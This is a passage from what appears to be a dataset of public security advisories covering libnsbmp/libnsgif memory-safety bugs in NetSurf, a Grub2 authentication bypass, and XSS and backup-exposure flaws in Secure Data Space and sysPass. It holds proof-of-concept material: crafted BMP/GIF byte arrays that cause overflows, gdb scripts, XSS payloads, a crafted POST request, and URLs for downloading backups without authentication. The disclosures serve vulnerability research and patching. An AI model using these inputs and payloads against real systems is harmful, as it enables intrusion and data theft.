src/libnsbmp.c #844..893:
,----
| static bmp_result bmp_decode_rgb(bmp_image *bmp, uint8_t **start, int bytes) {
| [...]
| uint8_t bit_shifts[8];
| uint8_t ppb = 8 / bmp->bpp;
| uint8_t bit_mask = (1 << bmp->bpp) - 1;
| uint8_t cur_byte = 0, bit, i;
|
| for (i = 0; i < ppb; i++)
| bit_shifts[i] = 8 - ((i + 1) * bmp->bpp);
| [...]
| /* Determine transparent index */
| if (bmp->limited_trans)
| bmp->transparent_index = bmp->colour_table[(*data >> bit_shifts[0]) & bit_mask];
|
| for (y = 0; y < bmp->height; y++) {
| [...]
| for (x = 0; x < bmp->width; x++) {
| if (bit >= ppb) {
| bit = 0;
| cur_byte = *data++;
| }
| scanline[x] = bmp->colour_table[(cur_byte >> bit_shifts[bit++]) & bit_mask];
| [...]
| }
| }
| *start = data;
| return BMP_OK;
| }
`----
Another NetSurf example:
,----
| ~/netsurf-all-3.3/netsurf$ gdb --args ./nsgtk oob.bmp
| [...]
| (gdb) b netsurf-all-3.3/libnsbmp/src/libnsbmp.c:531
| Breakpoint 1 at 0x516a3e: file src/libnsbmp.c, line 531.
| (gdb) b netsurf-all-3.3/libnsbmp/src/libnsbmp.c:869
| Breakpoint 2 at 0x5179bb: file src/libnsbmp.c, line 869.
| (gdb) b netsurf-all-3.3/libnsbmp/src/libnsbmp.c:886
| Breakpoint 3 at 0x517aab: file src/libnsbmp.c, line 886.
| (gdb) r
| [...]
| Breakpoint 1, bmp_analyse_header (bmp=0xdadc90, data=0xdb9e6a ""377377377"") at src/libnsbmp.c:531
| 531 bmp->colour_table = (uint32_t *)malloc(bmp->colours * 4);
| (gdb) p bmp->colours * 4
| $1 = 4
| (gdb) c
| [...]
| Breakpoint 3, bmp_decode_rgb (bmp=0xdadc90, start=0x7fffffffbff0, bytes=4) at src/libnsbmp.c:886
| 886 scanline[x] = bmp->colour_table[(cur_byte >> bit_shifts[bit++]) & bit_mask];
| (gdb) p (cur_byte >> bit_shifts[bit++]) & bit_mask
| $2 = 255
| (gdb)
`----
oob.bmp:
,----
| unsigned char bmp[] = {
| /* bmp_analyse() */
| 0x42, 0x4d, /* BM */
| 0x7e, 0x00, 0x00, 0x00, /* bmp size */
| 0x00, 0x00, /* reserved */
| 0x00, 0x00, /* reserved */
| 0x7a, 0x00, 0x00, 0x00, /* bmp->bitmap_offset */
|
| /* bmp_analyse_header() */
| 0x6c, 0x00, 0x00, 0x00, /* header_size */
| 0x01, 0x00, 0x00, 0x00, /* width */
| 0x01, 0x00, 0x00, 0x00, /* height */
| 0x01, 0x00, /* colour planes */
| 0x08, 0x00, /* bmp->bpp */
| 0x00, 0x00, 0x00, 0x00, /* bmp->encoding */
| 0x00, 0x00, 0x00, 0x00, /* size of bitmap */
| 0x00, 0x00, 0x00, 0x00, /* horizontal resolution */
| 0x00, 0x00, 0x00, 0x00, /* vertical resolution */
| 0x01, 0x00, 0x00, 0x00, /* bmp->colours */
| 0x00, 0x00, 0x00, 0x00, /* number of important colours */
| 0x00, 0x00, 0x00, 0x00, /* mask identifying bits of red component */
| 0x00, 0x00, 0x00, 0x00, /* mask identifying bits of green component */
| 0x00, 0x00, 0x00, 0x00, /* mask identifying bits of blue component */
| 0x00, 0x00, 0x00, 0x00, /* mask identifying bits of alpha component */
| 0x00, 0x00, 0x00, 0x00, /* color space type */
| 0x00, 0x00, 0x00, 0x00, /* x coordinate of red endpoint */
| 0x00, 0x00, 0x00, 0x00, /* y coordinate of red endpoint */
| 0x00, 0x00, 0x00, 0x00, /* z coordinate of red endpoint */
| 0x00, 0x00, 0x00, 0x00, /* x coordinate of green endpoint */
| 0x00, 0x00, 0x00, 0x00, /* y coordinate of green endpoint */
| 0x00, 0x00, 0x00, 0x00, /* z coordinate of green endpoint */
| 0x00, 0x00, 0x00, 0x00, /* x coordinate of blue endpoint */
| 0x00, 0x00, 0x00, 0x00, /* y coordinate of blue endpoint */
| 0x00, 0x00, 0x00, 0x00, /* z coordinate of blue endpoint */
| 0x00, 0x00, 0x00, 0x00, /* gamma red coordinate scale value */
| 0x00, 0x00, 0x00, 0x00, /* gamma green coordinate scale value */
| 0x00, 0x00, 0x00, 0x00, /* gamma blue coordinate scale value */
| 0xff, 0xff, 0xff, 0x00 /* bmp->colour_table[0] */
| };
`----
Solution
========
Both vulnerabilities are fixed in git HEAD[2].
Footnotes
_________
[1] [http://www.netsurf-browser.org/projects/libnsbmp/]
[2] [http://source.netsurf-browser.org/libnsbmp.git/]
Hans Jerry Illikainen"
3777,libnsgif: stack overflow (CVE-2015-7505) and out-of-bounds read (CVE-2015-7506),,CVE-2015-7505,"Overview
========
Libnsgif[1] is a decoding library for GIF images. It is primarily
developed and used as part of the NetSurf project.
As of version 0.1.2, libnsgif is vulnerable to a stack overflow
(CVE-2015-7505) and an out-of-bounds read (CVE-2015-7506) due to the way
LZW-compressed GIF data is processed.
Details
=======
src/libnsgif.c #80..133:
,----
| /* Maximum LZW bits available
| */
| #define GIF_MAX_LZW 12
| [...]
| static int table[2][(1 << GIF_MAX_LZW)];
| static unsigned char stack[(1 << GIF_MAX_LZW) * 2];
`----
src/libnsgif.c #423..628:
,----
| static gif_result gif_initialise_frame(gif_animation *gif) {
| [...]
| if (gif_data[0] > GIF_MAX_LZW)
| return GIF_DATA_ERROR;
| [...]
| }
`----
src/libnsgif.c #751..1053:
,----
| gif_result gif_decode_frame(gif_animation *gif, unsigned int frame) {
| [...]
| /* Initialise the LZW decoding
| */
| set_code_size = gif_data[0];
| [...]
| code_size = set_code_size + 1;
| clear_code = (1 << set_code_size);
| end_code = clear_code + 1;
| max_code_size = clear_code << 1;
| max_code = clear_code + 2;
| [...]
| }
`----
src/libnsgif.c #1145..1169:
,----
| void gif_init_LZW(gif_animation *gif) {
| [...]
| *stack_pointer++ =firstcode;
| }
`----
src/libnsgif.c #1172..1237:
,----
| static bool gif_next_LZW(gif_animation *gif) {
| [...]
| code = gif_next_code(gif, code_size);
| [...]
| incode = code;
| if (code >= max_code) {
| *stack_pointer++ = firstcode;
| code = oldcode;
| }
|
| /* The following loop is the most important in the GIF decoding cycle as every
| * single pixel passes through it.
| *
| * Note: our stack is always big enough to hold a complete decompressed chunk. */
| while (code >= clear_code) {
| *stack_pointer++ = table[1][code];
| new_code = table[0][code];
| if (new_code < clear_code) {
| code = new_code;
| break;
| }
| *stack_pointer++ = table[1][new_code];
| code = table[0][new_code];
| if (code == new_code) {
| gif->current_error = GIF_FRAME_DATA_ERROR;
| return false;
| }
| }
|
| *stack_pointer++ = firstcode = table[1][code];
| [...]
| oldcode = incode;
| [...]
| }
`----
CVE-2015-7505
=============
Since `gif_next_LZW()' writes onto the stack so long as `code' is at
least `clear_code', an overflow may eventually occur while processing a
maliciously crafted image.
Using NetSurf as an example:
,----
| ~/netsurf-all-3.3/netsurf$ gdb -x stack.py --args ./nsgtk stack.gif
| [...]
| stack overflow: ptr: 0x968903, end of stack: 0x968900 (+3)
| stack overflow: ptr: 0x968904, end of stack: 0x968900 (+4)
| stack overflow: ptr: 0x968905, end of stack: 0x968900 (+5)
| stack overflow: ptr: 0xf0000968906, end of stack: 0x968900 (+16492674416646)
|
| Program received signal SIGSEGV, Segmentation fault.
| 0x000000000051a890 in gif_next_LZW (gif=0xbccc00) at src/libnsgif.c:1210
| 1210 *stack_pointer++ = table[1][code];
| (gdb)
`----
stack.py:
,----
| class Breakpoint(gdb.Breakpoint):
| def stop(self):
| stack_pointer = get_hex(""stack_pointer"")
| stack = get_hex(""&stack"")
| stack_size = get_hex(""sizeof stack / sizeof *stack"")
| stack_end = stack + stack_size
|
| table_size = get_hex(""sizeof table / sizeof **table / 2"")
| code = get_hex(""code"")
|
| if stack_pointer > stack_end:
| print(""stack overflow: ptr: 0x%x, end of stack: 0x%x (+%d)"" %
| (stack_pointer, stack_end, stack_pointer - stack_end))
| if code >= table_size:
| print(""out-of-bounds read: code: %d (+%d)"" %
| (code, code - table_size + 1))
| return False
|
| def get_hex(arg):
| res = gdb.execute(""print/x %s"" % arg, to_string=True)
| x = res.split("" "")[-1].strip()
| return int(x, 16)
|
| Breakpoint(""netsurf-all-3.3/libnsgif/src/libnsgif.c:1210"")
| Breakpoint(""netsurf-all-3.3/libnsgif/src/libnsgif.c:1216"")
|
| gdb.execute(""run"")
`----
stack.gif:
,----
| unsigned char stack[] = {
| /* GIF87a */
| 0x47, 0x49, 0x46, 0x38, 0x37, 0x61,
|
| /* gif_initialise() */
| 0x04, 0x00, /* gif->width */
| 0x04, 0x33, /* gif->height */
| 0x00, /* gif->global_colours */
| 0x00, /* gif->background_index */
| 0x00, /* gif->aspect_ratio */
|
| /* gif_initialise_frame() */
| 0x2c, /* GIF_IMAGE_SEPARATOR */
| 0x00, 0x00, /* offset_x */
| 0x00, 0x00, /* offset_y */
| 0x1b, 0x00, /* width */
| 0x04, 0x00, /* height */
| 0x00, /* flags */
| 0x04, /* code size */
| 0x0d, /* block_size */
|
| /* image data */
| 0x10, 0xcb,
| 0x41, 0xf3,
| 0xf3, 0xf3,
| 0xf3, 0xf3,
| 0xf3, 0xf3,
| 0xf3, 0xf3,
| 0xf3,
|
| /* end of image data */
| 0x00,
|
| /* end of .gif */
| 0x3b
| };
`----
CVE-2015-7506
=============
If `set_code_size' is 0xc, `clear_code' is assigned a value of 4096.
Since the while-loop in `gif_next_LZW()' executes so long as `code >=
clear_code', an out-of-bounds read might occur due to `code' being used
to dereference `table' (2d array * 4096). A boundary check exist in
that if `code >= max_code', it's assigned the value of `oldcode' --
however, the result may still exceed `max_code' due to the bookkeeping
of the *original* value:
src/libnsgif.c #1172..1237:
,----
| static bool gif_next_LZW(gif_animation *gif) {
| [...]
| incode = code;
| if (code >= max_code) {
| *stack_pointer++ = firstcode;
| code = oldcode;
| }
| [...]
| oldcode = incode;
| [...]
| }
`----
Again, using NetSurf as an example:
,----
| ~/netsurf-all-3.3/netsurf$ gdb -x oob.py --args ./nsgtk oob.gif
| [...]
| out-of-bounds read: code: 6670 (+2575)
| out-of-bounds read: code: 7999 (+3904)
`----
oob.py:
,----
| class Breakpoint(gdb.Breakpoint):
| def stop(self):
| stack_pointer = get_hex(""stack_pointer"")
| stack = get_hex(""&stack"")
| stack_size = get_hex(""sizeof stack / sizeof *stack"")
| stack_end = stack + stack_size
|
| table_size = get_hex(""sizeof table / sizeof **table / 2"")
| code = get_hex(""code"")
|
| if stack_pointer > stack_end:
| print(""stack overflow: ptr: 0x%x, end of stack: 0x%x (+%d)"" %
| (stack_pointer, stack_end, stack_pointer - stack_end))
| if code >= table_size:
| print(""out-of-bounds read: code: %d (+%d)"" %
| (code, code - table_size + 1))
| return False
|
| def get_hex(arg):
| res = gdb.execute(""print/x %s"" % arg, to_string=True)
| x = res.split("" "")[-1].strip()
| return int(x, 16)
|
| Breakpoint(""netsurf-all-3.3/libnsgif/src/libnsgif.c:1210"")
| Breakpoint(""netsurf-all-3.3/libnsgif/src/libnsgif.c:1216"")
|
| gdb.execute(""run"")
`----
oob.gif:
,----
| unsigned char oob[] = {
| /* GIF87a */
| 0x47, 0x49, 0x46, 0x38, 0x37, 0x61,
|
| /* gif_initialise() */
| 0x04, 0x00, /* gif->width */
| 0x04, 0x33, /* gif->height */
| 0x00, /* gif->global_colours */
| 0x00, /* gif->background_index */
| 0x00, /* gif->aspect_ratio */
|
| /* gif_initialise_frame() */
| 0x2c, /* GIF_IMAGE_SEPARATOR */
| 0x00, 0x00, /* offset_x */
| 0x00, 0x00, /* offset_y */
| 0x1b, 0x00, /* width */
| 0x04, 0x00, /* height */
| 0x00, /* flags */
| 0x0c, /* code size */
| 0x0d, /* block_size */
|
| /* image data */
| 0x10, 0xcb,
| 0x41, 0xf3,
| 0xf3, 0xf3,
| 0xf3, 0xf3,
| 0xf3, 0xf3,
| 0xf3, 0xf3,
| 0xf3,
|
| /* end of image data */
| 0x00,
|
| /* end of .gif */
| 0x3b
| };
`----
Solution
========
Both vulnerabilities are fixed in git HEAD[2].
Footnotes
_________
[1] [http://www.netsurf-browser.org/projects/libnsgif/]
[2] [http://source.netsurf-browser.org/libnsgif.git/]
Hans Jerry Illikainen"
3786,Back to 28: Grub2 Authentication Bypass 0-Day [CVE-2015-8370],,CVE-2015-8370,"Hi everyone,
A vulnerability in Grub2 (Back to 28) has been found. Versions from 1.98
(December, 2009) to 2.02 (December, 2015) are affected. The vulnerability can be exploited under certain circumstances, allowing local attackers to bypass any kind of authentication (plain or hashed passwords). And so, the attacker may take control of the computer.
More details at:
http://hmarco.org/bugs/CVE-2015-8370-Grub2-authentication-bypass.html
Regards,
Hector Marco & Ismael Ripoll.
--
Dr. Hector Marco-Gisbert @ http://hmarco.org/
Cyber Security Researcher @ http://cybersecurity.upv.es
Universitat Politècnica de València (Spain)"
3813,[CVE-2015-7706] SECURE DATA SPACE API Multiple Non-Persistent Cross-Site Scripting Vulnerabilities,,CVE-2015-7706,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
secunet Security Networks AG Security Advisory
Advisory: SECURE DATA SPACE API Multiple Non-Persistent Cross-Site Scripting Vulnerabilities
1. DETAILS
- ----------
Product: SECURE DATA SPACE
Vendor URL: www.ssp-europe.eu
Type: Cross-site Scripting[CWE-79]
Date found: 2015-09-30
Date published: 2015-12-09
CVSSv2 Score: 4,3 (AV:N/AC:M/Au:N/C:N/I:P/A:N)
CVE: CVE-2015-7706
2. AFFECTED VERSIONS
- --------------------
All product versions (Online, Dedicated, For Linux/Windows) in
Web-Client v3.1.1-2
restApiVersion: 3.5.7-FINAL
sdsServerVersion: 3.4.14-FINAL
3. INTRODUCTION
- ---------------
""The highly secure business solution for easy storage, synchronization, distribution and management of data - regardless of location or device""
(from the vendor's homepage)
4. VULNERABILITY DETAILS
- ------------------------
The Secure Data Share version v3.1.1-2 is vulnerable to multiple unauthenticated Non-Persistent Cross-Site Scripting vulnerabilities when user-supplied input is processed by the server.[0]
#1 Proof-of-Concept:
https://example.com/api/v3//public/shares/downloads/111""}<BODY%20ONLOAD%3dalert('XSS')>
#2 Proof-of-Concept(authType parameter):
POST /api/v3/auth/login
{""login"":""a"",""password"":""a"",""language"":1,""authType"":""random<script>alert(1)</script>random""}
#3 Proof-of-Concept(login parameter):
POST /api/v3/auth/reset_password
{""login"":""random<script>alert(1)</script>random"",""language"":1}
5. SECURITY RISK
- ----------------
The vulnerabilities can be used to temporarily embed arbitrary script code into the context of the Secure Data Space backend interface, which offers a wide range of possible attacks such as stealing cookies or attacking the browser and its components.
6. SOLUTION
- -----------
Update to Secure Data Space Versions:
Web-Client 3.1.3 - Rev. 3 or higher with
SDS-API 3.5.7 or higher
7. REPORT TIMELINE
- ------------------
2015-09-30: Vulnerability discovered
2015-10-02: Vendor notified
2015-10-02: Vendor acknowledges the vulnerability
2015-10-05: CVE requested from MITRE
2015-10-05: CVE-2015-7706 assigned
2015-10-13: Vendor releases update and security advisory[0]
2015-12-09: Advisory released
8. REFERENCES / CREDITS
- -----------------------
This vulnerability was discovered and researched by Thomas Vogt from secunet Security Networks AG.
[0] https://kb.ssp-europe.eu/pages/viewpage.action?pageId=12059988
secunet Security Networks AG
- ----------------------------
secunet is one of Germany's leading providers of superior IT security. In close dialogue with its customers – enterprises, public authorities and international organisations – secunet develops and implements high-performance products and state-of-the-art IT security solutions. Thus, secunet not only keeps IT infrastructures secure for its customers, but also achieves intelligent process optimisation and creates sustainable added value. More information about secunet can be found at:
https://www.secunet.com
- --
secunet Security Networks AG
Kronprinzenstraße 30
45128 Essen, Germany
Local Court of Essen HRB 13615
Board of management: Dr. Rainer Baumgart (CEO), Thomas Pleines
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2
Comment: Using gpg4o v3.5.43.6457 - http://www.gpg4o.de/
Charset: utf-8
iQIcBAEBCAAGBQJWaBC9AAoJEEIZSc7HIQcnFVoP/AuguW4muL0nFuaJCZcT1UEw
YuHs6w3VnjnRH7w7h1EJwipvgKnIxPFNIFjlWOWSts32pbg5n23d7jbXubtYEjgr
USTIXJbflIsTbV2xIg0oWHFq3KIXPWjRU3BLIPN7SvGmVrkTR7acmwTHZbSPxh71
SmYdiP96kccoX+6Rf0bSL634lt8iHtHhr1MSDxkO3NaP5GdGQqXBX7cpacvdVoq1
IwmQpUiRpCtXA3NtnABPzEAosIOBde/knbYgFKSNRlnG0gekmvtvNiPNSi5P0wlq
7D3JD90m1ZqdnBR014OUfXj8lsNBIkzlHZzSJkgGBG3mNNRmjB7Mir0GODoNfIA7
t9igBmrjTSPgfAFjKUZiujs4xkT4jGqv6k6ziT2dMO9DOmCyKzTvV7nT5wPKZSgR
ilYqLiSFry5tIhk2Lm1lN4zuLPRhbzDl2LfKPsczBCPAdbP8XlUe0NNkbKlgCeL9
e9usCKTjfHCMPsXNK5QjjklVsVGQ9Fe8eyycSTJi1X+z8EjJV09dQ4xfKOPjiRdf
egP4W9j6wUqqjP2hPOJY8rwJuF98jNbZpsPWCir42hpYdrgUzZY6i99XsVgBnjpn
7JXkz3Z30E53VxZvl33JJwjFR8wPn5RXmO+VfZ1/iG/6wYoN5wROsgJGqSKyA0c8
RjfIxP+sWAqpsmzl5mhy
=Cbpf
-----END PGP SIGNATURE-----"
3831,[SYSS-2015-047] sysPass - Cross-Site Scripting (CWE-79),CWE-79,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2015-047
Product: sysPass
Vendor: http://cygnux.org/
Affected Version(s): 1.1.2.23 and below
Tested Version(s): 1.1.2.23
Vulnerability Type: Cross-Site Scripting (CWE-79)
Risk Level: Medium
Solution Status: Fixed
Vendor Notification: 2015-07-14
Solution Date: 2015-10-26
Public Disclosure: 2015-12-07
CVE Reference: Not yet assigned
Author of Advisory: Daniele Salaris (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
sysPass is an web based Password Manager written in PHP and Ajax with a
built-in multiuser environment.
The functionality ""Account Details"" is prone to a reflected cross-site
scripting vulnerability.
The software manufacturer describes the web application as follows
(see [1]):
""sysPass is a web password manager written in PHP that allows the
password management in a centralized way and in a multiuser environment.
The main features are:
* HTML5 and Ajax based interface
* Password encryption with AES-256 CBC.
* Users and groups management.
* Advanced profiles management with 16 access levels.
* MySQL, OpenLDAP and Active Directory authentication.
* Activity alerts by email.
* Accounts change history.
* Accounts files management.
* Inline image preview.
* Multilanguage.
* Links to external Wiki.
* Portable backup.
* Action tracking and event log.
* One-step install process.""
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The PHP script ajax_getContent.php of the web application functionality
""Account Details"" is vulnerable to reflected cross-site scripting
via the parameter ""lastAction"".
The web application sysPass inserts the injected code into the ""back""
button of the result web page where it can be triggered.
This reflected cross-site scripting vulnerability can be exploited in
the context of an authenticated user by sending a specially crafted HTTP
POST request (see PoC section).
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
The following HTTP POST request using the JavaScript code ""'-alert(1)-'""
as the value for the parameter ""lastAction"" demonstrates the reflected
cross-site scripting vulnerability by showing a JavaScript alert box
after the ""back"" button was clicked:
POST /sysPass/ajax/ajax_getContent.php HTTP/1.1
Host: <HOST>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0
Accept: text/html, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://localhost/sysPass/index.php
Content-Length: 74
Cookie: PHPSESSID=<SESSIONID>
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
action=accview&lastAction=accsearch'-alert(1)-'&id=1&isAjax=1
The server answers as follows:
HTTP/1.1 200 OK
(...)
<img src=""imgs/back.png"" title=""Back"" class=""inputImg"" id=""btnBack""
OnClick=""doAction('accsearch&#39;-alert(1)-&#39;', 'accview',1)""/>
(...)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
The reported security vulnerability has been fixed in a new software
release. Update to the new software version.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2015-07-14: Vulnerability discovered
2015-07-14: Vulnerability reported to vendor
2015-10-26: Release of new software version that addresses the reported
security issue.
2015-12-07: Public release of security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Web site of sysPass - sysadmin password manager
http://wiki.syspass.org/en/start
[2] SySS Security Advisory SYSS-2015-047
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2015-047.txt
[3] SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Daniele Salaris of the SySS GmbH.
E-Mail: disclosure (at) syss.de
Key fingerprint = E135 4E23 6091 A85C 9E14 577A 28DF B3A7 0A98 A9D4
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIcBAEBCgAGBQJWZTi3AAoJECjfs6cKmKnUUW0P/2AkQ/8y7xiv3I+LVSyb8STZ
XPVGYCBoqaTO2aQUeaMlE5pOYS0NzSsogFJuVk61D/GI6zI0IxJp22U0Myu9u0Af
rNn7zfjtmJvR80xbIEfPdnFXRXic9V8vazrBUUpMVhRjaF8ox5Hx9m04YzMQrdYt
u9vLumjT8cpLpLu+jzEET1p1+itpmI/Ru6M+VqdAS0jFRImemqIT/o5U18G6ayvG
JZ2W2HCybu/ErQEw/FtOFK/SGAi8egCLdwEnFoeTxlz4uQNYFe/4MGbzFWgH1p5t
euyrMEyGkqWSaIuyskKoHqW9sYc3wlFzmYLxCIk7HhmXqdJwXuDwBtTRqFI2t2k2
BVJK53xCo727W9IMQqtbqpCNrU5ojKtMr/CxslYFiIHddSRvEuiccDgI3ZKyp+xA
o7GVND9fdNkIX1Njbmb9hBtyygDTAkz1RPN92l3L4ESF5fEgXCeVHy5xdl7KoD4w
GDAh718tE2cQXqTRhBk1uWzvjjcbDcQ3PLnMhS4nd9l10amyfXRn5zQyOQBi746H
BXUGAD4S6VDLt4MGkTYDHYrkmzYSGhPoU5/t0L6thjkeSt+YjIhtjafXl+xj046J
e6s5ozyIaJD+CFPwyKByzAjyW0R4wCoEV+8jJVotxf8xzjRDMJEx4A059WFi1602
TAg4fytmdoelxYtdJNHN
=xgz1
-----END PGP SIGNATURE-----"
3832,[SYSS-2015-046] sysPass - Insecure Direct Object References (CWE-932),CWE-932,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2015-046
Product: sysPass
Manufacturer: http://cygnux.org/
Affected Version(s): 1.0.9 and below
Tested Version(s): 1.0.9
Vulnerability Type: Insecure Direct Object References (CWE-932)
Exposure of Backup File to an Unauthorized Control
Sphere (CWE-530)
Risk Level: High
Solution Status: Fixed
Manufacturer Notification: 2015-06-10
Solution Date: 2015-10-26
Public Disclosure: 2015-12-07
CVE Reference: Not yet assigned
Author of Advisory: Daniele Salaris (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
sysPass is an web-based Password Manager written in PHP and Ajax with a
built-in multiuser environment.
The web application is prone to a security vulnerability that allows an
unauthorized attacker to download existing backup files containing
sensitive data.
The software manufacturer describes the web application as follows
(see [1]):
""sysPass is a web password manager written in PHP that allows the
password management in a centralized way and in a multiuser environment.
The main features are:
* HTML5 and Ajax based interface
* Password encryption with AES-256 CBC.
* Users and groups management.
* Advanced profiles management with 16 access levels.
* MySQL, OpenLDAP and Active Directory authentication.
* Activity alerts by email.
* Accounts change history.
* Accounts files management.
* Inline image preview.
* Multilanguage.
* Links to external Wiki.
* Portable backup.
* Action tracking and event log.
* One-step install process.""
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The backup functionality of the web-based password manager sysPass
creates the following two backup files that are stored within the
application's backup folder:
* sysPass_db.sql
* sysPass.tar.gz
The file sysPass_db.sql contains a full database dump and the file
sysPass.tar.gz contains all contents of the sysPass web application
folder.
An unauthorized attacker can simply download these two existing backup
files via the following URLs:
http(s)://<HOST>/backup/sysPass_db.sql
http(s)://<HOST>/backup/sysPass.tar.gz
Thus, an external attacker without valid user credentials can gain
unauthorized access to all configuration and application data of the
password manager sysPass. With access to this data, an attacker can
perform further attacks in order to recover user credentials of sysPass
users or to decrypt encrypted password information contained within the
database.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
The following URLs can be used to download existing backup files of the
password manager sysPass from an external attacker's perspective:
http(s)://<HOST>/backup/sysPass_db.sql
http(s)://<HOST>/backup/sysPass.tar.gz
For example:
http://syspass.org/demo/backup/sysPass_db.sql
http://syspass.org/demo/backup/sysPass.tar.gz
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
The reported security vulnerabilities have been fixed in a new software
release. Update to the new software version.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2015-06-08: Vulnerability discovered
2015-06-10: Vulnerability reported to manufacturer
2015-10-26: Release of new software version that addresses the reported
security issues. Discussed security fix with manufacturer.
2015-12-07: Public release of security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Web site of sysPass - sysadmin password manager
http://wiki.syspass.org/en/start
[2] SySS Security Advisory SYSS-2015-046
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2015-046.txt
[3] SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Daniele Salaris of the SySS GmbH.
E-Mail: disclosure (at) syss.de
Key fingerprint = E135 4E23 6091 A85C 9E14 577A 28DF B3A7 0A98 A9D4
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIcBAEBCgAGBQJWZTiTAAoJECjfs6cKmKnUhucP/3VqXYMAvJtSbbbHwsZyh0Td
T9LtezrGtZeZze4CAMcfJvUZO9/wiDbdDsaEAV2UXrYDvA8f9rXJleJGS0Zrggwx
ktKMN09N/GH0PohrPI4+JFFE6Eolmhlf5PkVRFU8X8Z9orqD8s8NqcHg8P4e5FJy
Dey/+SD9SlbH/ICjxlkjaGXOlCqSHT3mQqhALaKSwikUN3v/YlzVaYwGnUwsYsVt
arZTqKf6c2Sk8LAwZTWLbm6EB/FxuATObV+tblHd/KOcaDhmp0ykL8r1Mve/XQTw
NX3aH9yXoRcpHjCSFa6QK89d4dY4Pv9ejpyMATcYmbLa4hEMZ421cAkJuFobHiCg
MtlHXcVhNn7K+8ogxFk5EKyMEIRYUWqsmh6ZfW9F1qJ5jVezqjYdCmPdUeHlZ66u
Mk2ikWNu3IkSv0fQy0HVzEvzHlbgzWYvWVaLCVwwS9s4JZTDvKF9E+xAeK2iC9Ul
OOM1RgYcY57dFL7M6dY6OpMM8xapbJHtYjEC8ammfc9rhRIHQO4evBXGufs5vmc0
hWHIRLuF4rx0bja4qAbxK6l+7lWdgaPSHDOW7I2v+NUdjvPKcjndsAOB9FiK+jhI
+Q09ybOMLEzICOlo3VhRwyaEc7X+HZRdTEijU3piV6nxKyhiCI2AVuMRKjJyV3pc
tz8Q0g6YqzlFi8VnPgSV
=YMqY
-----END PGP SIGNATURE-----"
